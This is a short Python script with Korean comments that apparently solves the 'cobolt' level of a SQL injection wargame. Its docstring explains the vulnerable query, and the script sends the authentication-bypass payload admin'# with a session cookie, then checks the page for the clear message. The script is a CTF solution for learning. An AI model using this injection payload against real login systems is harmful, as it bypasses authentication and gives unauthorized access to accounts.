# -*- coding : UTF-8 -*-
from requests import get

'''

이 문제는 select id from prob_cobolt where id='' and pw=md5('')
뒤에 pw를 md5()함수를 이용하여 변환한 뒤, pw와 비교하는 쿼리를 갖고 있습니다.
무차별 대입 공격으로 어느 정도 풀 수는 있겠으나, 시간이 오래 걸릴 것입니다.
따라서 id의 값을 admin'# 이라고 하면 쿼리는
select id from prob_cobolt where id='admin'#' and pw=md5('')
이렇게 되어 뒤의 쿼리가 주석이 되기 때문에 id가 admin인 값만 불러오게 됩니다.


'''

#url과 파라미터를 설정합니다.
url = "http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php"
param = "?id=admin'%23"
new_url = url + param

#쿠키를 설정합니다. 당신의 쿠키로 대체해야합니다.
cookie = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")

#requests 모듈로 HTTP 요청을 보냅니다.
r = get(new_url, cookies=cookie)

if r.text.find("<h2>COBOLT Clear!</h2>") > 0:
    print("축하합니다! Cobolt를 클리어했습니다!")
    
